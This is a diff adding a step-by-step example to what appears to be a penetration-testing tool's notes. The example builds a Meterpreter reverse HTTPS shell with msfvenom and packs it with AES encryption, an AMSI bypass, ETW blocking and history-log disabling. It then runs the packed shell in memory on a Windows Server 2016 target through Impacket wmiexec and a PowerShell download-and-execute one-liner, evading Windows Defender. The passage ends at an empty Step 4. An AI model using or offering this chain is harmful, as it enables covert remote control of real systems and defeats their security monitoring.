@@ -440,3 +440,73 @@ luid 149493
                 password (hex)
 <SNIP>
 
+
+===================================================================================================================================================
+Example 4 - Create & run a packed/encrypted version of a (x64) Meterpreter reverse https shell (.ps1) on a Windows Server 2016 without getting 
+            detected by Windows Defender
+===================================================================================================================================================
+
+Step 1 - Generate a stageless Meterpreter reverse HTTPS shell in PowerShell format with the option 'psh-reflection' (+ use an autosign SSL cert)
+-------------------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.1.30 LPORT=443 -a x64 -f psh-reflection -o Invoke-meterpreter-x64-reverse-https.ps1
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 201308 bytes
+Final size of psh-reflection file: 270926 bytes
+Saved as: Invoke-meterpreter-x64-reverse-https.ps1
+
+
+Step 2 - Create a packed/encrypted version of your Meterpreter script 'Invoke-meterpreter-x64-reverse-https.ps1' using 'Invoke-PoSH-Packer.ps1'
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\temp> . .\Invoke-PoSH-Packer.ps1
+
+  ___     ___ _  _     ___         _
+ | _ \___/ __| || |___| _ \___  __| |_____ _ _
+ |  _/ _ \__ \ __ |___|  _/ _ |/ _| / / -_) '_|
+ |_| \___/___/_||_|   |_| \__,|\__|_\_\___|_|
+                                             v1.1
+Usage:
+> Invoke-PoSH-Packer -FileUrl https://URL/script.ps1 -OutFile C:\path\Packed-script.ps1
+> Invoke-PoSH-Packer -FilePath C:\path\script.ps1 -OutFile C:\path\Packed-script.ps1
+
+Features:
+[*] AES encryption and GZip/Deflate compression (based on 'Xencrypt')
+[*] AMSI bypass
+[*] Blocking Event Tracing for Windows (ETW)
+[*] Disabling PowerShell history logging
+[*] Basic sandbox evasion techniques (optional -sandbox)
+
+
+PS C:\temp> Invoke-PoSH-Packer -FileUrl http://192.168.1.30:8080/Invoke-meterpreter-x64-reverse-https.ps1 -OutFile C:\temp\packed-posh-msf-reverseshell.ps1
+[*] Downloading the remote file: 'http://192.168.1.30:8080/Invoke-meterpreter-x64-reverse-https.ps1'
+[*] File compression (GZip)
+[*] File encryption (AES)
+[*] Adding 'A'M'S'I' bypass
+[*] Adding 'E'T'W' bypass
+[*] Disabling PoSh history logging
+[*] Writing the obfuscated & encrypted PowerShell script: 'C:\temp\packed-msf-x64-reverse-https.ps1' ...
+[+] Done!
+
+
+Step 3 - Upload & execute into memory the packed/encrypted version of the script 'packed-posh-msf-reverseshell.ps1' on a target Windows server 2016
+         without being detected by the Windows Defender AV 
+-----------------------------------------------------------------------------------------------------------------------------------------------------
+
+C:\Users\Administrator\Documents\Tools-Pentest\4-Impacket_windows>wmiexec.exe administrator@192.168.1.76
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+
+Password:
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>
+
+C:\>cd temp
+
+C:\temp>powershell -c iex (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/temp/packed-posh-msf-reverseshell.ps1');
+
+
+Step 4 - Enjoy your meterprerter shell 
+---------------------------------------
